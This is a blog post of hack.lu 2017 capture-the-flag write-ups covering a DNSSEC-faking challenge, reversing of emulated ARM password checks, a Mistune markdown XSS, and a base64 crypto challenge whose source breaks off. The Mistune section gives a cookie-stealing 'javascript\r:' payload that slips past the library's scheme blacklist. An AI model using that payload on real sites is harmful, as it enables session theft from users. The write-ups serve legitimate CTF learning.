<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://www.vhn.vn/blog/xmlrpc.php">

<title>hack.lu 2017 &#8211; VHNVN&#039;s blog</title>
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//ajax.googleapis.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="VHNVN&#039;s blog &raquo; Feed" href="https://www.vhn.vn/blog/index.php/feed/" />
<link rel="alternate" type="application/rss+xml" title="VHNVN&#039;s blog &raquo; Comments Feed" href="https://www.vhn.vn/blog/index.php/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="VHNVN&#039;s blog &raquo; hack.lu 2017 Comments Feed" href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.vhn.vn\/blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.9"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='jquery-ui-css'  href='//ajax.googleapis.com/ajax/libs/jqueryui/1.8.1/themes/base/jquery-ui.css?ver=4.9.9' type='text/css' media='all' />
<link rel='stylesheet' id='oria-bootstrap-css'  href='https://www.vhn.vn/blog/wp-content/themes/oria/css/bootstrap/bootstrap.min.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='oria-style-css'  href='https://www.vhn.vn/blog/wp-content/themes/oria/style.css?ver=4.9.9' type='text/css' media='all' />
<style id='oria-style-inline-css' type='text/css'>
body, .widget a { color:#717376}
.site-title a, .site-title a:hover { color:#fff}
.site-description { color:#bbb}
.site-logo { max-width:200px; }
.site-branding { padding-top:80px;padding-bottom:80px; }
.site-title { font-size:62px; }
.site-description { font-size:18px; }

</style>
<link rel='stylesheet' id='oria-body-fonts-css'  href='//fonts.googleapis.com/css?family=Lato%3A400%2C700%2C400italic%2C700italic&#038;ver=4.9.9' type='text/css' media='all' />
<link rel='stylesheet' id='oria-headings-fonts-css'  href='//fonts.googleapis.com/css?family=Oswald%3A300%2C700&#038;ver=4.9.9' type='text/css' media='all' />
<link rel='stylesheet' id='oria-fontawesome-css'  href='https://www.vhn.vn/blog/wp-content/themes/oria/fonts/font-awesome.min.css?ver=4.9.9' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-widget-social-icons-styles-css'  href='https://www.vhn.vn/blog/wp-content/plugins/jetpack/modules/widgets/social-icons/social-icons.css?ver=20170506' type='text/css' media='all' />
<link rel='stylesheet' id='enlighter-local-css'  href='https://www.vhn.vn/blog/wp-content/plugins/enlighter/resources/EnlighterJS.min.css?ver=3.6' type='text/css' media='all' />
<link rel='stylesheet' id='enlighter-webfonts-css'  href='//fonts.googleapis.com/css?family=Source+Code+Pro%3Aregular%2C700&#038;ver=3.6' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css'  href='https://www.vhn.vn/blog/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_css-css'  href='https://www.vhn.vn/blog/wp-content/plugins/jetpack/css/jetpack.css?ver=6.1.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/plugins/jetpack/_inc/build/related-posts/related-posts.min.js?ver=20150408'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/themes/oria/js/jquery.fitvids.js?ver=1'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/themes/oria/js/jquery.slicknav.min.js?ver=1'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/themes/oria/js/parallax.min.js?ver=1'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/themes/oria/js/scripts.js?ver=1'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-includes/js/imagesloaded.min.js?ver=3.2.0'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-includes/js/masonry.min.js?ver=3.3.2'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/themes/oria/js/imagesloaded.pkgd.min.js?ver=1'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/themes/oria/js/masonry-init.js?ver=1'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/themes/oria/js/owl.carousel.min.js?ver=1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var sliderOptions = {"slideshowspeed":"4000"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/themes/oria/js/slider-init.js?ver=1'></script>
<link rel='https://api.w.org/' href='https://www.vhn.vn/blog/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.vhn.vn/blog/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.vhn.vn/blog/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Vue single file component and typescript' href='https://www.vhn.vn/blog/index.php/2017/07/12/vue-single-file-component-and-typescript/' />
<link rel='next' title='HITCON CTF 2017 Quals' href='https://www.vhn.vn/blog/index.php/2017/11/06/hitcon-ctf-2017-quals/' />
<link rel="canonical" href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/" />
<link rel='shortlink' href='https://wp.me/p6MMNs-22' />
<link rel="alternate" type="application/json+oembed" href="https://www.vhn.vn/blog/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.vhn.vn%2Fblog%2Findex.php%2F2017%2F10%2F19%2Fhack-lu-2017%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://www.vhn.vn/blog/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.vhn.vn%2Fblog%2Findex.php%2F2017%2F10%2F19%2Fhack-lu-2017%2F&#038;format=xml" />

<link rel='dns-prefetch' href='//v0.wordpress.com'/>
<link rel='dns-prefetch' href='//i0.wp.com'/>
<link rel='dns-prefetch' href='//i1.wp.com'/>
<link rel='dns-prefetch' href='//i2.wp.com'/>
<style type='text/css'>img#wpstats{display:none}</style><!--[if lt IE 9]>
<script src="https://www.vhn.vn/blog/wp-content/themes/oria/js/html5shiv.js"></script>
<![endif]-->
		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
		<style type="text/css">
/* <![CDATA[ */
img.latex { vertical-align: middle; border: none; }
/* ]]> */
</style>
		<style type="text/css">
			.site-header {
				background-image: url(https://www.vhn.vn/blog/wp-content/themes/oria/images/header.jpg);
			}
		</style>
		
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="hack.lu 2017" />
<meta property="og:url" content="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/" />
<meta property="og:description" content="Visit the post for more." />
<meta property="article:published_time" content="2017-10-19T15:47:46+00:00" />
<meta property="article:modified_time" content="2017-10-19T18:02:28+00:00" />
<meta property="og:site_name" content="VHNVN&#039;s blog" />
<meta property="og:image" content="https://s0.wp.com/i/blank.jpg" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="hack.lu 2017" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Visit the post for more." />

<!-- End Jetpack Open Graph Tags -->
</head>

<body class="post-template-default single single-post postid-126 single-format-standard">

<div class="preloader"><div id="preloader-inner"><div class="preload">&nbsp;</div></div></div>
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header" role="banner">

		<div class="top-bar clearfix no-toggle">
					
					</div>

		<div class="container">
			<div class="site-branding">
				<h1 class="site-title"><a href="https://www.vhn.vn/blog/" rel="home">VHNVN&#039;s blog</a></h1><h2 class="site-description">Smile with the life, it will smile with you!</h2>			</div><!-- .site-branding -->
		</div>

		<nav id="site-navigation" class="main-navigation" role="navigation">
			<div id="primary-menu" class="menu clearfix"></div>
		</nav><!-- #site-navigation -->
		<nav class="mobile-nav"></nav>

	</header><!-- #masthead -->
	
	
	<div id="content" class="site-content clearfix">
				<div class="container content-wrapper">
		
	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-126" class="post-126 post type-post status-publish format-standard hentry category-ctf">

		
	<header class="entry-header">
		<h1 class="entry-title">hack.lu 2017</h1>
				<div class="entry-meta">
			<span class="posted-on"><a href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/" rel="bookmark"><time class="entry-date published" datetime="2017-10-19T22:47:46+00:00">October 19, 2017</time><time class="updated" datetime="2017-10-20T01:02:28+00:00">October 20, 2017</time></a></span><span class="byline"> <span class="author vcard"><a class="url fn n" href="https://www.vhn.vn/blog/index.php/author/vanhoavn/">vanhoavn</a></span></span>		</div><!-- .entry-meta -->
			</header><!-- .entry-header -->

	<div class="entry-content">
		<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Misc, Web) DnSoSecure - by kunte_, utnubu -100 (+ 100)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
<p>We found this <a href="https://dnsosecure.flatearth.fluxfingers.net/">Flag-Submission-Service</a> that is used by the OTHER-SIDE. Try to get it to submit the flag to you!</div></div>
<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
<p>View source give us the <a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/source.zip">source of this challenge</a>:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="html">&lt;!-- &lt;a href="/static/source.zip"&gt;Source&lt;/a&gt; --&gt;</pre>
<p>Index file validating the input text and do the secret:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python"># views.py
...
@app.route('/', methods=['GET', 'POST'])
def index():
    form = DNSServer()
    if form.validate_on_submit():
        ip = correct_dnssec(form.dnsip.data, app.config['DOMAIN'])
        if ip:
            if check_ipv4(ip):
                send_secret(ip, app.config['FLAG'], app.config['PORT'])
            flash('Sending data ... ', 'success')
        else:
            flash('Error!', 'error')
    return render_template('index.html', form=form)
...
# utils.py
...

def correct_dnssec(nsaddr, domain):
    #
    name = dns.name.from_text(domain)
    key = {
        name: dns.rrset.from_text(
            domain, 3600, 'IN', 'DNSKEY',
            '256 3 7 AwEAAeJd3Xyd8l3rWDx46UwPMyLOSVcbuwDgEvt2iEWTAghVbpw5M2YN 0GxUqa6vWI/RAhSynF4fxSvp1z3PnKBFle/Qxz7MzfPgH0spzriWsP8k qjs0Y9/xJU0tzZJ2TrIypdmEqpKtMbs3gRrrADz8pr/AdI7bjvX4r6Oh ty04lG8zyj1wwuWXi/oVfk1rTD9I2aq7SWK9REnueUFRsshMLQK5Vgpo Row0HmrE7Peg59lFFSi54rSJivb/4Tb0P8AtIlIUW0ZZOR9E/MsswWFZ Qw56A0Z5LJK4t8RmV5+vAhflNn/uTSEOpC08vUqkNQbOBXr1Ie/t57H6 ywvsKwEYo9s=',
            '257 3 7 AwEAAdth+HteT0kUim5+hOkyTpMU1FbNfxjn7otvpcA0ZSb/37Tr+WRJ l1nmzHkmrW+gJuzj5M+1QPEv41CujWe8EdGOyA3jM2KENj7NMdiNjh1G puzQa7YFxR4z5SG8+M5zvO5F3CTFWU5tZCTzkvk4Zbs5aJ3RZ6Zk1EBK xwoKz1CGCoedBM1VcKwJ2H+NT15m1cb/AfsSEljTyvruUUiJo84+MRPh luYtPrVKIwnHe6qxvhLSvpG0HFNNkBudy/TOf7C51zmdkpW+3hvbzp/I 79LEuXyYwXft4vpxKNv4zTGOoXNrBAxHcfmvAJsplIzSGcM84yRD+oWm Pu/WF+ESuPv9bmws0hZ2L2+dLpKZjDjb8ppxFS/zJFfWqqErRWssQo64 4lET6m2qET1g22YeB5iLAhVfAmTMZtxnhLqSHJ1EdQIwKm3RJfUsr+z+ Wxb9BZS/P2OSUsSzLOQ7hWjViCE45JMW0gGnMrvSeloAePtvYasfBjaT IDhW2knhKVr2ZoJ6I7pvZBrc/hLB2NGiFaN2otLwIX6InRTT8zrndDY8 uXwVsrBH/4UXy0CIf0PNwjqyFTALSx2DYGW1aU9y0wiZbX5h3msJGRO3 eiHP6QNv+bQJ3f1isMuaAFXT07gcfrAVYT72clU5Nep1Dp6hBfmkfnGT jhiPj16+cfJerrIP'
        )
    }
    request = dns.message.make_query(domain, dns.rdatatype.A, want_dnssec=True)
    try:
        request = dns.query.udp(request, nsaddr, timeout=7)
    except:
        return False
    answer = request.answer
    if len(answer) &lt; 2:
        # dnsserc not supported
        return False
    else:
        try:
            dns.dnssec.validate(answer[0], answer[1], key)
            return str(answer[0].to_rdataset()[0])
        except:
            # dnssec failed
            return False

</pre>
<p>So this problem is faking DNS and *bypass* the dnssec checker function, after a while trying to crack that public key, i found out that the source contain <code>.git</code>, checkout the branch <code>eddb23375ea4e08c67a63088ea08b4d5fc18a406</code> give us the private keys and that&#8217;s enough to build a dns server for this problem.</p>
</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Web, Rev) Triangle - by kunte_ -100 (+ 64)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
<p>Everything is controlled by the <a href="https://triangle.flatearth.fluxfingers.net/">Triangle</a>!</p>
</div></div>
<p><span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;"><div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden"></span></p>
<p>It&#8217;s just a basic js-only webpage which check login by following function:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">function login(){
  var input = document.getElementById('password').value;
  var enc = enc_pw(input);
  var pw = get_pw();
  if(test_pw(enc, pw) == 1){
    alert('Well done!');
  }
  else{
    alert('Try again ...');
  }
}</pre>
<p>These methods defined in <code>secret.js</code>, simple deobfucating give us:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null">function test_pw(e, _) {
    var t = stoh(atob(getBase64Image("eye"))),
        r = 4096,
        m = 8192,
        R = 12288,
        a = new uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM);
    a.reg_write_i32(uc.ARM_REG_R9, m), a.reg_write_i32(uc.ARM_REG_R10, R), a.reg_write_i32(uc.ARM_REG_R8, _.length), a.mem_map(r, 4096, uc.PROT_ALL);
    for (var o = 0; o &lt; o1.length; o++) a.mem_write(r + o, [t[o1[o]]]);
    a.mem_map(m, 4096, uc.PROT_ALL), a.mem_write(m, stoh(_)), a.mem_map(R, 4096, uc.PROT_ALL), a.mem_write(R, stoh(e));
    var u = r,
        c = r + o1.length;
    return a.emu_start(u, c, 0, 0), a.reg_read_i32(uc.ARM_REG_R5)
}

function enc_pw(e) {
    var _ = stoh(atob(getBase64Image("frei"))),
        t = 4096,
        r = 8192,
        m = 12288,
        R = new uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM);
    R.reg_write_i32(uc.ARM_REG_R8, r), R.reg_write_i32(uc.ARM_REG_R9, m), R.reg_write_i32(uc.ARM_REG_R10, e.length), R.mem_map(t, 4096, uc.PROT_ALL);
    for (var a = 0; a &lt; o2.length; a++) R.mem_write(t + a, [_[o2[a]]]);
    R.mem_map(r, 4096, uc.PROT_ALL), R.mem_write(r, stoh(e)), R.mem_map(m, 4096, uc.PROT_ALL);
    var o = t,
        u = t + o2.length;
    return R.emu_start(o, u, 0, 0), htos(R.mem_read(m, e.length))
}

function get_pw() {
    for (var e = stoh(atob(getBase64Image("templar"))), _ = "", t = 0; t &lt; o3.length; t++) _ += String.fromCharCode(e[o3[t]]);
    return _
}</pre>
<p>So both <code>test_pw</code> and <code>enc_pw</code> use Unicorn to emulate some ARM code, obtaining these memory images and load into IDA give us:</p>
<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>test_pw assembly</div><div class="su-spoiler-content su-clearfix" style="display:none">
<pre class="EnlighterJSRAW" data-enlighter-language="asm">ROM:00000000 sub_0
ROM:00000000                 MOV             R0, R9
ROM:00000004                 MOV             R1, R10
ROM:00000008                 MOV             R3, R8
ROM:0000000C                 MOV             R4, #0
ROM:00000010                 MOV             R5, #0
ROM:00000014                 MOV             R12, #0
ROM:00000018
ROM:00000018 loop                                    ; CODE XREF: sub_0+4C↓j
ROM:00000018                 LDRB            R2, [R0]
ROM:0000001C                 LDRB            R6, [R1]
ROM:00000020                 ADD             R6, R6, #5
ROM:00000024                 AND             R12, R4, #1
ROM:00000028                 CMP             R12, #0
ROM:0000002C                 BEQ             r4_le
ROM:00000030                 SUB             R6, R6, #3
ROM:00000034
ROM:00000034 r4_le                                   ; CODE XREF: sub_0+2C↑j
ROM:00000034                 CMP             R2, R6
ROM:00000038                 BNE             fail
ROM:0000003C                 ADD             R0, R0, #1
ROM:00000040                 ADD             R1, R1, #1
ROM:00000044                 ADD             R4, R4, #1
ROM:00000048                 CMP             R4, R3
ROM:0000004C                 BLT             loop
ROM:00000050                 MOV             R5, #1
ROM:00000054
ROM:00000054 fail                                    ; CODE XREF: sub_0+38↑j
ROM:00000054                 MOV             R0, #0
ROM:00000058                 MOV             R1, #0
ROM:0000005C                 MOV             R2, #0
ROM:00000060                 MOV             R3, #0
ROM:00000064                 MOV             R4, #0
ROM:00000068                 MOV             R6, #0
ROM:0000006C                 MOV             R7, #0
ROM:00000070                 MOV             R8, #0
ROM:00000074                 MOV             R9, #0
ROM:00000078                 MOV             R10, #0
ROM:0000007C                 MOV             R12, #0
ROM:0000007C ; End of function sub_0</pre>
</div></div>
<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>enc_pw assembly</div><div class="su-spoiler-content su-clearfix" style="display:none">
<pre class="EnlighterJSRAW" data-enlighter-language="asm">ROM:00000000 sub_0
ROM:00000000                 MOV             R0, R8
ROM:00000004                 MOV             R1, R9
ROM:00000008                 MOV             R2, R10
ROM:0000000C                 MOV             R3, #0
ROM:00000010                 MOV             R5, #0
ROM:00000014
ROM:00000014 loop                                    ; CODE XREF: sub_0+44↓j
ROM:00000014                 LDRB            R4, [R0]
ROM:00000018                 CMP             R5, #1
ROM:0000001C                 BNE             r4_branch
ROM:00000020                 AND             R6, R3, #3
ROM:00000024                 ADD             R4, R4, R6
ROM:00000028
ROM:00000028 r4_branch                               ; CODE XREF: sub_0+1C↑j
ROM:00000028                 ADD             R4, R4, #6
ROM:0000002C                 AND             R5, R4, #1
ROM:00000030                 STRB            R4, [R1]
ROM:00000034                 ADD             R0, R0, #1
ROM:00000038                 ADD             R1, R1, #1
ROM:0000003C                 ADD             R3, R3, #1
ROM:00000040                 CMP             R3, R2
ROM:00000044                 BLT             loop
ROM:00000048                 MOV             R0, #0
ROM:0000004C                 MOV             R1, #0
ROM:00000050                 MOV             R2, #0
ROM:00000054                 MOV             R3, #0
ROM:00000058                 MOV             R4, #0
ROM:0000005C                 MOV             R5, #0
ROM:00000060                 MOV             R6, #0
ROM:00000064                 MOV             R7, #0
ROM:00000068                 MOV             R9, #0
ROM:0000006C                 MOV             R10, #0
ROM:0000006C ; End of function sub_0
</pre>
</div></div>
<p>Rewrite these functions using php:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">&lt;?php
function test_pw($e, $p) {
  for($i=0;$i&lt;strlen($p);$i++) {
    if (ord($e[$i]) !== ord($p[$i]) - (($i%2)?2:5)) return false; 
  }
  return true;
}

function enc_pw($p) {
  $len = strlen($p);
  $last_is_odd = 0;
  $res = "";
  for($i=0;$i&lt;$len;$i++) {
    $c = ord($p[$i]) + (($last_is_odd)?($i%4):(0)) + 6;
    $res .= chr($c);
    $last_is_odd = $c % 2;
  };
  return $res;
}
?&gt;

</pre>
<p>Then it&#8217;s easy to revert these functions:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">&lt;?php
function get_pw_from_test($p){
  $r = "";
  for($i=0;$i&lt;strlen($p);$i++) {
    $r.=chr(ord($p[$i]) - (($i%2)?2:5));
  }
  return $r;
}
function dec_pw($p) {
  $r = "";
  for($i=strlen($p)-1;$i&gt;=0;$i--){
    $last_is_odd = $i&gt;0 &amp;&amp; ord($p[$i-1]) % 2;
    $r = chr(ord($p[$i]) - 6 - ($last_is_odd?($i%4):0)).$r;
  }
  return $r;
}
?&gt;</pre>
<p>And then it&#8217;s easy to get the code:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">&lt;?php
$enc_pass = get_pw_from_test(get_pw());
var_dump(test_pw($enc_pass, get_pw()));
$pass = dec_pw($enc_pass);
var_dump(enc_pw($pass)==$enc_pass);
var_dump($pass, $enc_pass);
?&gt;</pre>
<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">CODE</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">MPmVH94PTH7hhafgYahYaVfKJNLRNQLZ</div></div>
</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Web) Mistune - by kunte_ -150 (- 18)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">Markdown parsers are fun. Now click <a href="https://mistune.flatearth.fluxfingers.net/">here</a> and steal the cookie!</div></div>
<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
<p>It&#8217;s a markdown-rendering service which we can test output of their internal markdown renderer and can submit messages to admin using markdown.</p>
<p>&nbsp;</p>
<div class="su-quote su-quote-style-default su-quote-has-cite"><div class="su-quote-inner su-clearfix">Try to steal the cookie!</p>
<p>We use mistune.Renderer(escape=True, hard_wrap=True)</p>
<p>The admin will look at your converted Markdown.</p>
<p>The admin will click on links (&lt;a/&gt;). <span class="su-quote-cite">DnSoSecure - hacklu 2017</span></div></div>
<p>So this problem is definitely XSS and require us to obtain cookie of admin. Finding source of mistune give us</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python"># https://github.com/lepture/mistune/blob/master/mistune.py
...
_scheme_blacklist = ('javascript:', 'vbscript:')
...
def escape_link(url):
    """Remove dangerous URL schemes like javascript: and escape afterwards."""
    lower_url = url.lower().strip('\x00\x1a \n\r\t')
    for scheme in _scheme_blacklist:
        if lower_url.startswith(scheme):
            return ''
    return escape(url, quote=True, smart_amp=False)
</pre>
<p>So <code>javascript:</code> scheme urls will be black out, but we can easily bypass that by using carriage return character <code>"javascript\r:document.location.href=(...)+document.cookie"</code>, and then just wait for the flag, we can input that carriage return by running command in console:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">$("textarea").replaceWith($('&lt;input type="hidden" name="text"/&gt;').val('[link](javascript\r:document.location.href=(...)+document.cookie)'))</pre>
</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto) b64 - by Sceptic -100 (+ 66)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
<p>Taking part in elite, exclusive groups entails being able to hide secrets from the lesser folk and only provide it to the gifted. Our intern recently proposed a solution to do just that.</p>
<p>nc flatearth.fluxfingers.net 1718</p>
<p><a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/b64-1e3d68559bf59696b8233d66321a90eb.zip">Download</a><br />
</div></div>
<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
<p>Problem source:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python2

import flag from flag
from base64 import b64decode
from SocketServer import ThreadingTCPServer
from sys import argv
from binascii import hexlify, unhexlify
import SocketServer
import os

N = 8
MAX_TRIES = 1024
PAD = 64

welcome = "Welcome! :-)\n"
menu = "What would you like to do:\n\t1: supply encoded input,\n\t2: tell me my secret\n&gt; "

def gen_secret():
    return os.urandom(N)

def crypt(s1, s2):
    return "".join(map(lambda c: chr(((ord(c[0])^ord(c[1]))+PAD)%256), zip(s1,s2)))

b64chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"
def decode(s, secret):
    enc = ""
    s = crypt(s, secret)
    
    for c in s:
        if c in b64chars:
            enc+=c

    if len(enc) % 4 == 1:
        enc = enc[:-1]

    while len(enc) % 4 != 0:
        enc+="="

    return b64decode(enc)

class B64Handler(SocketServer.BaseRequestHandler):
    def setup(self):
        self.tries = 0
        self.secret = gen_secret()

    def handle(self):
        self.request.send(welcome)
        for i in range(MAX_TRIES):
            self.request.send("Round number: {}\n{}".format(i, menu))
            if self.request.recv(2)[0] == "1":
                self.request.send("What would you like me to decode?\n&gt; ")
                answer = self.request.recv(len(self.secret))
                decoded = decode(answer, self.secret)
                self.request.send("Alright, here is your answer: {}\n".format(decoded))

            else:
                self.request.send("Alright, what is my secret (hex encoded)?\n&gt; ")
                answer = self.request.recv(2*len(self.secret)+1).rstrip()
                if answer==hexlify(self.secret):
                    self.request.send("Well done, here is your flag: {}\n".format(flag))
                else:
                    self.request.send("This was not what I was looking for. :-(\n")
                break

        self.request.send("Bye!\n")

def main():
    SocketServer.ThreadingTCPServer.allow_reuse_address = True
    if len(argv) &lt; 2:
        print("Usage: {} &lt;PORT&gt;".format(argv[0]))
    else:
        LOCAL_PORT = int(argv[1])
